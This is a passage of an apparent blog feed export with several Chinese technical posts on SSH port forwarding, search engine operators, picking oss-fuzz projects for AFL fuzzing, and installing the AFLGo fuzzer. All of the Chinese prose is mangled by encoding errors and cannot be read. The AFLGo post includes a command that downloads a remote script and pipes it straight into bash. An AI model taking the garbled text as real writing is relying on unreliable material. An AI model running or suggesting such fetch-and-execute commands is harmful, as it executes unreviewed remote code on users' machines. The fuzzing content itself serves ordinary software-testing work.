    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSHç«¯å£è½¬å‘ç”¨æ³•è§£æ</title>
    <link href="/2021/02/18/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%94%A8%E6%B3%95%E8%A7%A3%E6%9E%90/"/>
    <url>/2021/02/18/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%94%A8%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>SSHç«¯å£è½¬å‘æ˜¯ä¸€ä¸ªå¾ˆå®ç”¨çš„è¿ç»´æŠ€å·§ï¼Œæˆ‘ç»“åˆäº†man pageè§£æäº†SSHç«¯å£è½¬å‘çš„æœ¬åœ°è½¬å‘(-L)ï¼Œè¿œç¨‹è½¬å‘(-R)ï¼ŒåŠ¨æ€è½¬å‘(-D)å’Œå¸¸ç”¨ç›¸å…³å‚æ•°çš„ç”¨æ³•ã€‚</p><span id="more"></span><h2 id="åè¯è®¾ç½®"><a href="#åè¯è®¾ç½®" class="headerlink" title="åè¯è®¾ç½®"></a>åè¯è®¾ç½®</h2><p>ä¸ºäº†æ–¹ä¾¿è¡¨è¿°ï¼Œæˆ‘å®šä¹‰äº†ä¸€äº›åè¯ï¼ˆå¯èƒ½å¹¶ä¸è§„èŒƒï¼‰</p><ul><li><p>å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼š</p><ul><li>sshå®¢æˆ·ç«¯ï¼šå‘èµ·sshè¿æ¥è¯·æ±‚çš„æ‰€åœ¨ç«¯ï¼ŒæŒ‡ssh-clientï¼Œä¹Ÿå¯ä»¥æŒ‡å…¶æ‰€åœ¨çš„ä¸»æœº</li><li>sshæœåŠ¡ç«¯ï¼šsshè¿æ¥è¯·æ±‚çš„å¯¹è±¡æ‰€åœ¨ç«¯ï¼ŒæŒ‡ssh-serverï¼Œä¹Ÿå¯ä»¥æŒ‡å…¶æ‰€åœ¨çš„ä¸»æœº</li><li>ç«¯å£å®¢æˆ·ç«¯ï¼šå‘æŸç«¯å£å‘èµ·æœåŠ¡è¯·æ±‚çš„åº”ç”¨æˆ–ä¸»æœº</li><li>ç«¯å£æœåŠ¡ç«¯ï¼šæƒ³æŸç«¯å£æä¾›æœåŠ¡å“åº”çš„åº”ç”¨æˆ–ä¸»æœº</li></ul></li><li><p>æœºå™¨ï¼š</p><ul><li>æœ¬åœ°ä¸»æœºï¼ˆlocalï¼‰ï¼šæŒ‡sshå®¢æˆ·ç«¯æ‰€åœ¨çš„ä¸»æœºï¼Œè®°ä½œA</li><li>è¿œç«¯ä¸»æœºï¼ˆremoteï¼‰ï¼šæŒ‡sshæœåŠ¡ç«¯æ‰€åœ¨çš„ä¸»æœºï¼Œè®°ä½œB</li><li>Hostä¸»æœºï¼ˆhostï¼‰ï¼šæŒ‡è¦è½¬å‘çš„ç«¯å£æœåŠ¡ç«¯æ‰€åœ¨çš„ä¸»æœºï¼Œè®°ä½œC</li></ul></li></ul><h2 id="æœ¬åœ°è½¬å‘"><a href="#æœ¬åœ°è½¬å‘" class="headerlink" title="æœ¬åœ°è½¬å‘"></a>æœ¬åœ°è½¬å‘</h2><p>man pageï¼š</p><pre><code class="hljs bash">-L [bind_address:]port:host:hostport-L [bind_address:]port:remote_socket-L local_socket:host:hostport-L local_socket:remote_socket        Specifies that connections to the given TCP port or Unix socket on the <span class="hljs-built_in">local</span> (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on the <span class="hljs-built_in">local</span> side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the <span class="hljs-built_in">local</span> port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port hostport, or the Unix socket remote_socket, from the remote machine.        Port forwardings can also be specified <span class="hljs-keyword">in</span> the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address <span class="hljs-keyword">in</span> square brackets.        By default, the <span class="hljs-built_in">local</span> port is bound <span class="hljs-keyword">in</span> accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to <span class="hljs-built_in">bind</span> the connection to a specific address.  The bind_address of â€œlocalhostâ€ indicates that the listening port be bound <span class="hljs-keyword">for</span> <span class="hljs-built_in">local</span> use only, <span class="hljs-keyword">while</span> an empty address or â€˜*â€™ indicates that the port should be available from all interfaces.</code></pre><h2 id="è¿œç¨‹è½¬å‘"><a href="#è¿œç¨‹è½¬å‘" class="headerlink" title="è¿œç¨‹è½¬å‘"></a>è¿œç¨‹è½¬å‘</h2><p>man pageï¼š</p><pre><code class="hljs bash">-R [bind_address:]port:host:hostport-R [bind_address:]port:local_socket-R remote_socket:host:hostport-R remote_socket:local_socket-R [bind_address:]port        Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the <span class="hljs-built_in">local</span> side.        This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.  Whenever a connection is made to this port or Unix socket, the connection is <span class="hljs-keyword">for</span>â€warded over the secure channel, and a connection is made from the <span class="hljs-built_in">local</span> machine to either an explicit destination specified by host port hostport, or local_socket, or, <span class="hljs-keyword">if</span> no explicit destination was specified, ssh will act as a SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.        Port forwardings can also be specified <span class="hljs-keyword">in</span> the configuration file.  Privileged ports can be forwarded only when logging <span class="hljs-keyword">in</span> as root on the remote machine.  IPv6 addresses can be specified by enclosing the address <span class="hljs-keyword">in</span> square brackets.        By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a bind_address.  An empty bind_address, or the address â€˜*â€™, indicates that the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed <span class="hljs-keyword">if</span> the server<span class="hljs-string">&#x27;s GatewayPorts option is enabled (see sshd_config(5)).</span><span class="hljs-string"></span><span class="hljs-string">        If the port argument is â€˜0â€™, the listen port will be dynamically allocated on the server and reported to the client at run time.  When used together with -O forward the allocated port will be printed to the standard output.</span></code></pre><h2 id="åŠ¨æ€è½¬å‘"><a href="#åŠ¨æ€è½¬å‘" class="headerlink" title="åŠ¨æ€è½¬å‘"></a>åŠ¨æ€è½¬å‘</h2><p>man pageï¼š</p><pre><code class="hljs bash">-D [bind_address:]port        Specifies a <span class="hljs-built_in">local</span> â€œdynamicâ€ application-level port forwarding.  This works by allocating a socket to listen to port on the <span class="hljs-built_in">local</span> side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is <span class="hljs-keyword">then</span> used to determine <span class="hljs-built_in">where</span> to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified <span class="hljs-keyword">in</span> the configuration file.        IPv6 addresses can be specified by enclosing the address <span class="hljs-keyword">in</span> square brackets.  Only the superuser can forward privileged ports.  By default, the <span class="hljs-built_in">local</span> port is bound <span class="hljs-keyword">in</span> accordance with the GatewayPorts setting. However, an explicit bind_address may be used to <span class="hljs-built_in">bind</span> the connection to a specific address.  The bind_address of â€œlocalhostâ€ indicates that the listening port be bound <span class="hljs-keyword">for</span> <span class="hljs-built_in">local</span> use only, <span class="hljs-keyword">while</span> an empty address or â€˜*â€™ indicates that the port should be available from all interfaces.</code></pre><h2 id="ç›¸å…³å‚æ•°"><a href="#ç›¸å…³å‚æ•°" class="headerlink" title="ç›¸å…³å‚æ•°"></a>ç›¸å…³å‚æ•°</h2>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœç´¢å¼•æ“é«˜çº§æœç´¢æŠ€å·§</title>
    <link href="/2021/01/20/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/"/>
    <url>/2021/01/20/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>å¸¸è§æœç´¢å¼•æ“Googleå’ŒBaiduçš„é«˜çº§æœç´¢æŠ€å·§</p><span id="more"></span><h2 id="1-é€»è¾‘åŒ¹é…"><a href="#1-é€»è¾‘åŒ¹é…" class="headerlink" title="1 é€»è¾‘åŒ¹é…"></a>1 é€»è¾‘åŒ¹é…</h2><p><p class="note note-primary">æ ¹æ®åŒ¹é…é€»è¾‘å¯åˆ†ä¸ºï¼šç²¾å‡†ï¼Œå±è”½ï¼Œæ¨¡ç³Šå’Œæ’ä»–åŒ¹é…</p></p><h3 id="1-1-ç²¾å‡†æœç´¢"><a href="#1-1-ç²¾å‡†æœç´¢" class="headerlink" title="1.1 ç²¾å‡†æœç´¢"></a>1.1 ç²¾å‡†æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>&quot;å…³é”®è¯&quot;</code></li><li>ä½œç”¨ï¼šå®Œå…¨æ¯”é…åŒå¼•å·ä¸­çš„å†…å®¹ï¼Œä¹Ÿå³å¿…é¡»åŒ…å«è¯¥å†…å®¹</li></ul><h3 id="1-2-å±è”½æœç´¢"><a href="#1-2-å±è”½æœç´¢" class="headerlink" title="1.2 å±è”½æœç´¢"></a>1.2 å±è”½æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>-å…³é”®è¯</code></li><li>ä½œç”¨ï¼šå±è”½<strong>-</strong>å·åé¢çš„å†…å®¹ï¼Œæ³¨æ„<strong>-</strong>å·å‰éœ€æœ‰ç©ºæ ¼ï¼Œè€Œåé¢çš„å…³é”®è¯éœ€ç´§è·Ÿç€<strong>-</strong>å·</li></ul><h3 id="1-3-æ¨¡ç³Šæœç´¢"><a href="#1-3-æ¨¡ç³Šæœç´¢" class="headerlink" title="1.3 æ¨¡ç³Šæœç´¢"></a>1.3 æ¨¡ç³Šæœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>*å…³é”®è¯</code></li><li>ä½œç”¨ï¼šæ¨¡ç³Šæœç´¢é€šé…ç¬¦<strong>*</strong>æ¥ç€<strong>å…³é”®è¯</strong>çš„å†…å®¹ï¼ŒåŒæ ·æ³¨æ„ç©ºæ ¼å’Œå…³é”®è¯ç´§è·Ÿç€é€šé…ç¬¦</li></ul><h3 id="1-4-æ’ä»–æœç´¢"><a href="#1-4-æ’ä»–æœç´¢" class="headerlink" title="1.4 æ’ä»–æœç´¢"></a>1.4 æ’ä»–æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>OR</code></li><li>ä½œç”¨ï¼šé€šè¿‡<strong>OR</strong>åˆ†éš”ä¸¤ä¸ªæœç´¢å…³é”®è¯ï¼Œåªä¼šå‡ºç°å…¶ä¸­ä¸€ä¸ªçš„æœç´¢ç»“æœ</li></ul><h2 id="2-æœç´¢ä½ç½®"><a href="#2-æœç´¢ä½ç½®" class="headerlink" title="2 æœç´¢ä½ç½®"></a>2 æœç´¢ä½ç½®</h2><p><p class="note note-primary">æ ¹æ®æœç´¢çš„ä½ç½®ï¼Œå¯åˆ†ä¸ºï¼šç«™å†…ï¼Œæ ‡é¢˜ï¼Œç½‘å€å’Œæ­£æ–‡æœç´¢</p></p><h3 id="2-1-ç«™å†…æœç´¢"><a href="#2-1-ç«™å†…æœç´¢" class="headerlink" title="2.1 ç«™å†…æœç´¢"></a>2.1 ç«™å†…æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>site:ç½‘ç«™åœ°å€</code></li><li>ä½œç”¨ï¼šåœ¨ç›®æ ‡ç½‘ç«™å†…æœç´¢ç›¸å…³å†…å®¹</li></ul><h3 id="2-2-æ ‡é¢˜æœç´¢"><a href="#2-2-æ ‡é¢˜æœç´¢" class="headerlink" title="2.2 æ ‡é¢˜æœç´¢"></a>2.2 æ ‡é¢˜æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>intitle:å…³é”®è¯</code></li><li>ä½œç”¨ï¼šå…³é”®è¯å¿…é¡»å‡ºç°åœ¨ç½‘ç«™æ ‡é¢˜ä¸­</li></ul><h3 id="2-3-ç½‘å€æœç´¢"><a href="#2-3-ç½‘å€æœç´¢" class="headerlink" title="2.3 ç½‘å€æœç´¢"></a>2.3 ç½‘å€æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>inurl:å…³é”®è¯</code></li><li>ä½œç”¨ï¼šå…³é”®è¯å¿…é¡»å‡ºç°åœ¨ç½‘é¡µurlä¸­</li></ul><h3 id="2-4-æ­£æ–‡æœç´¢"><a href="#2-4-æ­£æ–‡æœç´¢" class="headerlink" title="2.4 æ­£æ–‡æœç´¢"></a>2.4 æ­£æ–‡æœç´¢</h3><ul><li>æŒ‡ä»¤ï¼š<code>intext:å…³é”®è¯</code></li><li>ä½œç”¨ï¼šå…³é”®è¯å¿…é¡»å‡ºç°åœ¨ç½‘é¡µæ­£æ–‡ä¸­</li></ul><h2 id="3-å…¶å®ƒ"><a href="#3-å…¶å®ƒ" class="headerlink" title="3 å…¶å®ƒ"></a>3 å…¶å®ƒ</h2><p><p class="note note-primary">æœ€ååˆ™æ˜¯å…¶å®ƒæœç´¢æ–¹å¼ï¼Œå¦‚æœç´¢æŒ‡å®šç±»å‹çš„æ–‡ä»¶</p></p><h3 id="3-1-æœç´¢æ–‡ä»¶ç±»å‹"><a href="#3-1-æœç´¢æ–‡ä»¶ç±»å‹" class="headerlink" title="3.1 æœç´¢æ–‡ä»¶ç±»å‹"></a>3.1 æœç´¢æ–‡ä»¶ç±»å‹</h3><ul><li>æŒ‡ä»¤ï¼š<code>filetype:æ–‡ä»¶ç±»å‹</code></li><li>ä½œç”¨ï¼šæœç´¢æŒ‡å®šæ–‡ä»¶ç±»å‹çš„æ–‡ä»¶</li></ul>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸è§å¼€æºè½¯ä»¶å’Œå¼€æºåº“çš„è°ƒç”¨å…³ç³»</title>
    <link href="/2020/11/16/%E5%B8%B8%E8%A7%81%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%BC%80%E6%BA%90%E5%BA%93%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/"/>
    <url>/2020/11/16/%E5%B8%B8%E8%A7%81%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%BC%80%E6%BA%90%E5%BA%93%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p>å¼€æºç¤¾åŒºæœ‰ç€è®¸å¤šå¼€æºè½¯ä»¶ï¼Œæˆ‘å°†ä¼˜å…ˆä»ä»¥ä¸‹<strong>å‡ ä¸ªè§’åº¦</strong>å»æŒ‘é€‰å¼€æºè½¯ä»¶ï¼Œå¹¶æ‰¾å¯»å®ƒä»¬ä¹‹é—´çš„<strong>ä¾èµ–ä¸è°ƒç”¨å…³ç³»</strong>ï¼š</p><span id="more"></span><ul><li><strong>æ”¯æŒAFLè¿›è¡ŒFuzzing</strong>çš„å¼€æºè½¯ä»¶(å‚è€ƒ<a href="https://github.com/aflgo/oss-fuzz/tree/master/projects">https://github.com/aflgo/oss-fuzz/tree/master/projects</a>)</li><li>æä¾›<strong>æ–‡ä»¶æ“ä½œAPI</strong>æˆ–è€…<strong>ç½‘ç»œé€šä¿¡API</strong>çš„å¼€æºå·¥å…·ã€‚å› ä¸ºå®ƒä»¬æ‰€æ¶‰åŠçš„<strong>æ–‡ä»¶è¯»å–</strong>å’Œ<strong>é€šä¿¡åè®®æ ˆ</strong>å¾€å¾€æ›´å®¹æ˜“äº§ç”Ÿcrash</li><li>ä½“ç§¯ä¸å¤§ï¼Œ<strong>æ˜“äºæºç å®‰è£…</strong></li></ul><h2 id="1-å¼€æºè½¯ä»¶æŒ‘é€‰"><a href="#1-å¼€æºè½¯ä»¶æŒ‘é€‰" class="headerlink" title="1 å¼€æºè½¯ä»¶æŒ‘é€‰"></a>1 å¼€æºè½¯ä»¶æŒ‘é€‰</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> yaml<span class="hljs-keyword">def</span> <span class="hljs-title function_">checkAflSupport</span>(<span class="hljs-params">dirname</span>):    <span class="hljs-keyword">try</span>:        f = <span class="hljs-built_in">open</span>(dirname + <span class="hljs-string">&#x27;/project.yaml&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)        data = yaml.load(f)    <span class="hljs-keyword">except</span>:        <span class="hljs-comment"># print(&#x27;there is no project.yaml in %s&#x27; %dirname)</span>        <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;afl&#x27;</span> <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;fuzzing_engines&#x27;</span>]:            toolname = dirname.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]            <span class="hljs-built_in">print</span>(toolname)    <span class="hljs-keyword">except</span>:        <span class="hljs-comment"># print(&#x27;there is no fuzzing_engines given&#x27;)</span>        <span class="hljs-keyword">pass</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    proj_dir = <span class="hljs-string">&#x27;./projects&#x27;</span>    projects = os.listdir(proj_dir)    <span class="hljs-keyword">for</span> proj_name <span class="hljs-keyword">in</span> projects:        <span class="hljs-keyword">if</span> os.path.isdir(proj_dir + <span class="hljs-string">&#x27;/&#x27;</span> + proj_name):            checkAflSupport(proj_dir + <span class="hljs-string">&#x27;/&#x27;</span> + proj_name)</code></pre><p>é‡‡ç”¨<code>parseFuzzProj.py</code>è„šæœ¬æ‹‰å–<a href="https://github.com/aflgo/oss-fuzz/tree/master/projects">oss-fuzz</a>ä¸­æ”¯æŒAFLçš„å¼€æºè½¯ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹è½¯ä»¶åˆ—è¡¨ï¼š</p><pre><code class="hljs bash">binutils brotli brunsli bzip2c-ares capstone cjson cmarkgraphicsmagick grok harfbuzzhermes hostapjbig2dec json-clcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4miniz monero mupdfnanopb ndpi nestegg nghttp2 ntpopenjpeg openthread opus otspcre2 pffft proxygenqubes-osrnpspeex stbtidy-html5 tor tremorunicorn usrsctpvorbiswireshark woff2 wolfssl wuffsxzyajl-rubyzlib zlib-ng zstd</code></pre><p><strong>æŒ‘é€‰ä¸æ–‡ä»¶æ“ä½œå’Œç½‘ç»œé€šä¿¡ç›¸å…³çš„å¼€æºè½¯ä»¶ï¼š</strong></p><pre><code class="hljs bash"><span class="hljs-comment"># æ–‡ä»¶æ“ä½œç›¸å…³çš„å¼€æºè½¯ä»¶</span>binutils bzip2groklibyaml libxml2 libjson-c3xzzlib<span class="hljs-comment"># ç½‘ç»œé€šä¿¡ç›¸å…³çš„å¼€æºè½¯ä»¶</span>fastnetmonlibpcap libndpi wireshark</code></pre><h2 id="2-è½¯ä»¶ä¾èµ–å…³ç³»æŸ¥æ‰¾"><a href="#2-è½¯ä»¶ä¾èµ–å…³ç³»æŸ¥æ‰¾" class="headerlink" title="2 è½¯ä»¶ä¾èµ–å…³ç³»æŸ¥æ‰¾"></a>2 è½¯ä»¶ä¾èµ–å…³ç³»æŸ¥æ‰¾</h2><p><strong>è½¯ä»¶ä¹‹é—´çš„è°ƒç”¨å…³ç³»å³ä¾èµ–å…³ç³»</strong>ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©åŒ…ç®¡ç†å·¥å…·<code>apt</code>æ¥æŸ¥æ‰¾å¼€æºè½¯ä»¶çš„<strong>ä¾èµ–æœ‰å“ªäº›</strong>ä»¥åŠ<strong>è¢«å“ªäº›è½¯ä»¶ä¾èµ–</strong>ï¼š</p><ul><li><p>æŸ¥è¯¢é•œåƒæºæ˜¯å¦æœ‰æŸæ¬¾å¼€æºè½¯ä»¶<code>SOFTWARE</code>ï¼š</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-cache search SOFTWARE_NAME | grep SOFTWARE_NAME</code></pre></li><li><p>æŸ¥è¯¢æŸæ¬¾å¼€æºè½¯ä»¶<code>SOFTWARE</code>çš„ä¾èµ–ï¼š</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-cache depends SOFTWARE_NAME | grep Depends</code></pre></li><li><p>æŸ¥è¯¢æŸæ¬¾å¼€æºè½¯ä»¶<code>SOFTWARE</code>è¢«å“ªäº›è½¯ä»¶ä¾èµ–ï¼š</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-cache rdepends SOFTWARE_NAME</code></pre></li></ul><h2 id="3-å¼€æºè½¯ä»¶ä¾èµ–ç»„åˆåˆ†æ"><a href="#3-å¼€æºè½¯ä»¶ä¾èµ–ç»„åˆåˆ†æ" class="headerlink" title="3 å¼€æºè½¯ä»¶ä¾èµ–ç»„åˆåˆ†æ"></a>3 å¼€æºè½¯ä»¶ä¾èµ–ç»„åˆåˆ†æ</h2><h3 id="3-1-libpcap"><a href="#3-1-libpcap" class="headerlink" title="3.1 libpcap"></a>3.1 libpcap</h3><h4 id="ä¾èµ–ä¸è¢«ä¾èµ–"><a href="#ä¾èµ–ä¸è¢«ä¾èµ–" class="headerlink" title="ä¾èµ–ä¸è¢«ä¾èµ–"></a>ä¾èµ–ä¸è¢«ä¾èµ–</h4><p><strong>dependsï¼š</strong></p><ul><li>libc6</li></ul><p><strong>rdependsï¼š</strong></p><ul><li>wireshark-qtï¼Œwireshark-gtkï¼Œtshark</li><li>tcpdumpï¼Œtcpreplay</li><li>snortï¼Œsuricataï¼Œfastnetmon</li><li>nmap</li></ul><h4 id="ä»£ç ç›¸ä¼¼æ€§"><a href="#ä»£ç ç›¸ä¼¼æ€§" class="headerlink" title="ä»£ç ç›¸ä¼¼æ€§"></a>ä»£ç ç›¸ä¼¼æ€§</h4><ul><li><strong>ä¸Nmapï¼š</strong><ul><li>netmap/libpcapä¸libpcapä»“åº“ä¸‹æœ‰å¤§é‡åŒå.cä»£ç æ–‡ä»¶ï¼Œä¸”æœ‰è‹¥å¹²åŒåç›®å½•</li></ul></li></ul><p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20201116221441.png"/></p><ul><li><p><strong>ä¸suricataï¼š</strong></p><ul><li>source-pcap.cä¸­å­˜åœ¨libpcapçš„APIè°ƒç”¨</li></ul></li><li><p><strong>ä¸wiresharkï¼š</strong></p><ul><li>wireshark/writecap/pcapio.cå­˜åœ¨libpcap magic numberç­‰ç›¸å…³å­—æ®µå’Œç»“æ„ä½“</li><li>wireshark/capture_opts.c</li></ul></li></ul><h2 id="TODOâ€¦"><a href="#TODOâ€¦" class="headerlink" title="TODOâ€¦"></a>TODOâ€¦</h2>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLGOå®‰è£…ä¸ä½¿ç”¨</title>
    <link href="/2020/10/21/AFLGO%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/10/21/AFLGO%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/aflgo/aflgo">AFLGO</a>æ˜¯åŸºäº<a href="https://github.com/google/AFL">AFL</a>æ”¹è¿›è€Œæ¥çš„ä¸€ç§å®šå‘ç°ç›’æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚å®šå‘Fuzzçš„é¼»ç¥–(ä¹‹ä¸€)ã€‚</p><span id="more"></span><p>AFLGoåŸºäºllvmå®ç°äº†å‡½æ•°è°ƒç”¨å›¾CGå’Œæ§åˆ¶æµå›¾CFGçš„è·å–ï¼Œç»“åˆå¯¹ç¨‹åºCG/CFGå®šä¹‰äº†ä¸€ç§åŸºäºç›®æ ‡distanceè¡¡é‡çš„ç§å­è°ƒåº¦ç­–ç•¥ï¼Œä½¿å¾—Fuzzerèƒ½å¤Ÿæ›´å¿«ç”Ÿæˆå¯æŠµè¾¾ç›®çš„ä½ç½®çš„æµ‹è¯•ç”¨ä¾‹ã€‚å®šå‘ç°ç›’æ¨¡ç³Šæµ‹è¯•(Directed Greybox Fuzzing)å¸¸å¸¸ç”¨äºè¡¥ä¸æµ‹è¯•ï¼Œæ¼æ´å¤ç°ç­‰ç­‰å…·å¤‡ç‰¹å®šå¾…æµ‹ç›®æ ‡çš„è½¯ä»¶æµ‹è¯•ä»»åŠ¡åœºæ™¯ã€‚</p><h2 id="1-å®‰è£…AFLGO"><a href="#1-å®‰è£…AFLGO" class="headerlink" title="1 å®‰è£…AFLGO"></a>1 å®‰è£…AFLGO</h2><ul><li>å®‰è£…llvmå’Œclangï¼Œå®˜æ–¹æ–‡æ¡£è¦æ±‚æ˜¯3.8æˆ–è€…4.0ï¼Œç»è¿‡è‡ªå·±æµ‹è¯•6.0å’Œ11.0å’Œä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œ<strong>ç¡®ä¿ç¯å¢ƒ$PATHæˆ–$LLVM_CONFIGå˜é‡å·²ç»æ·»åŠ </strong></li><li>æ‰§è¡Œ<a href="https://raw.githubusercontent.com/aflgo/aflgo/master/scripts/build/aflgo-build.sh">å®˜æ–¹ä¸€é”®å®‰è£…è„šæœ¬</a>ï¼Œæ­¤è„šæœ¬ç–‘ä¼¼æœ‰é—®é¢˜ï¼ˆæˆªæ­¢è‡³2020å¹´10æœˆï¼‰ï¼Œå…¶ä¸­llvm-4.0å’Œclang-4.0ä¼šå®‰è£…å¤±è´¥</li><li>å› æ­¤ä¾ç…§<a href="https://github.com/aflgo/aflgo">å®˜æ–¹README</a>çš„æµç¨‹ï¼Œæˆ‘ç¼–å†™äº†ä¸€é”®å®‰è£…<strong>llvm 12.0.1</strong>ä»¥åŠAFLGoçš„<a href="https://gitee.com/QGrain/aflgo-build/tree/master">è„šæœ¬</a>ï¼š</li></ul><pre><code class="hljs bash">curl https://gitee.com/QGrain/aflgo-build/raw/master/aflgo-build.sh | bash</code></pre><ul><li>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æˆ‘æ‰“åŒ…å¥½çš„<a href="https://hub.docker.com/repository/docker/qgrain/aflgo/general">dockeré•œåƒ</a></li></ul><pre><code class="hljs bash">docker pull qgrain/aflgo:ubuntu20.04_llvm12.0.1</code></pre><h2 id="2-ä½¿ç”¨AFLGO"><a href="#2-ä½¿ç”¨AFLGO" class="headerlink" title="2 ä½¿ç”¨AFLGO"></a>2 ä½¿ç”¨AFLGO</h2><p>å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼š</p><ul><li>è®¡ç®—distanceï¼šgen_distance_fast.pyä¸å¥½ç”¨ï¼Œå»ºè®®ç”¨genDistance.shã€‚æ­¤å¤–å¦‚æœæŠ¥é”™<code>AttributeError: module &#39;networkx&#39; has no attribute &#39;info&#39;</code>ï¼Œåˆ™å¸è½½networkxç„¶åå®‰è£…ä½ç‰ˆæœ¬</li></ul><pre><code class="hljs bash">pip uninstall networkxpip install networkx==2.2</code></pre><h2 id="3-å¸¸è§å¼€æºåº“å’Œè½¯ä»¶"><a href="#3-å¸¸è§å¼€æºåº“å’Œè½¯ä»¶" class="headerlink" title="3 å¸¸è§å¼€æºåº“å’Œè½¯ä»¶"></a>3 å¸¸è§å¼€æºåº“å’Œè½¯ä»¶</h2><p><strong>Google</strong>å·²ç»æ€»ç»“äº†<a href="https://github.com/google/oss-fuzz/tree/master/projects">ä¸‰ç™¾å¤šæ¬¾å¸¸è§çš„å¼€æºè½¯ä»¶</a>ç”¨äºæ¨¡ç³Šæµ‹è¯•ï¼Œæ¯ä¸€ä¸ªå·¥å…·çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><blockquote><p>/PATH/TO/TOOL<br>â”‚â”€  <strong>build.sh</strong><br>â”‚â”€  <strong>Dockerfile</strong><br>â”‚â”€  <strong>project.yaml</strong><br>â””â”€  <strong>my-api-repo</strong><br>        â”‚â”€  do_stuff_fuzzer.cpp<br>        â”‚â”€  do_stuff_fuzzer.dict<br>        â”‚â”€  do_stuff_unittest.cpp<br>        â”‚â”€  Makefile<br>        â”‚â”€  my_api.cpp<br>        â”‚â”€  my_api.h<br>        â”‚â”€  README.md<br>        â”‚â”€  standalone_fuzz_target_runner.cpp<br>    â””â”€  <strong>do_stuff_test_data</strong><br>        â”‚â”€  410c23d234e7f97a2dd6265eb2909324deb8c13a<br>        â”‚â”€  7a74862169c3375f4149daff75187cbca7372a38</p></blockquote><p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„å·¥å…·éƒ½æä¾›äº†ç›¸å…³çš„ä»£ç å’Œè¯­æ–™ï¼Œä½†æ˜¯æ¯ä¸€æ¬¾å·¥å…·éƒ½ç»™å‡ºäº†</p><ul><li><strong>project.yamlï¼š</strong>è®°å½•äº†é¡¹ç›®åŸºæœ¬ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</li></ul><pre><code class="hljs yaml"><span class="hljs-attr">homepage:</span> <span class="hljs-string">&quot;https://www.gnu.org/software/binutils/&quot;</span><span class="hljs-attr">language:</span> <span class="hljs-string">c++</span><span 